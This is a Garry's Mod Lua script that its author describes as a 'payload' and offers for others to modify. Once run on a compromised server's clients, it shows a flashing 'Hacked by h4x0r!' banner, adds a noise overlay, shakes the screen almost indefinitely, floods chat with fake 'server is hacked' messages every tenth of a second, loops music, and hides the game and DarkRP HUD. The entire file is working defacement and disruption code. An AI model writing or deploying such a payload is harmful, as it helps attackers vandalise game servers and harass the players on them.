--[[ 
it's one of the biggest payloads I've produced, I'm happy with the result. With a little knowledge you should be able to modify it to your liking
]]
surface.CreateFont( "HELLOHACKERMAN", {
    font = "CloseCaption_Bold", 
    extended = false,
    size = 100,
    weight = 700,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

hook.Add( "HUDPaint", "Hellohackerman", function()
    draw.DrawText( "Hacked by h4x0r!", "HELLOHACKERMAN", ScrW() * 0.5, ScrH() * 0.25, HSVToColor( RealTime() * 120 % 360, 1, 1 ), TEXT_ALIGN_CENTER )
end)

hook.Add( "RenderScreenspaceEffects", "HackermanTVScreenEffect", function()
    DrawMaterialOverlay( "effects/tvscreen_noise002a", -0.06 )
end )

util.ScreenShake( Vector(0, 0, 0), 16, 10, 999999999, 5000 )

timer.Create( "TCHM", 0.1, 0, function()
    chat.AddText("Console: ", Color(255,255,255), "this server is ", Color(255,0,0), "hacked! ", Color(255, 247, 0), "by ", Color(4, 255, 0), "Hackerman")
end)

timer.Create( "TCHMM", 44, 0, function() -- loop forever
    surface.PlaySound( "music/HL2_song23_SuitSong3.mp3" )
end)

-- hides all the shit that's hiding my epic hack visual effect
local fuckoff = {
    -- HL2 HUD
    ["CHudAmmo"] = true,
    ["CHudBattery"] = true,
    ["CHudDamageIndicator"] = true,
    ["CHudDeathNotice"] = true,
    ["CHudHealth"] = true,
    ["CHudPoisonDamageIndicator"] = true,
    ["CHudSecondaryAmmo"] = true,
    ["CHudSquadStatus"] = true,
    ["CHudWeaponSelection"] = true,
    ["CHudZoom"] = true,
    ["NetGraph"] = true,
    -- DARKRP HUD
    ["DarkRP_HUD"] = true,
    ["DarkRP_EntityDisplay"] = true,
    ["DarkRP_LocalPlayerHUD"] = true,
    ["DarkRP_Hungermod"] = true,
    ["DarkRP_Agenda"] = true,
    ["DarkRP_LockdownHUD"] = true,
    ["DarkRP_ArrestedHUD"] = true, 
    ["DarkRP_ChatReceivers"] = true,     
}

hook.Add( "HUDShouldDraw", "FuckVanillaHUD", function( name )
    if ( fuckoff[ name ] ) then
        return false
    end
end )
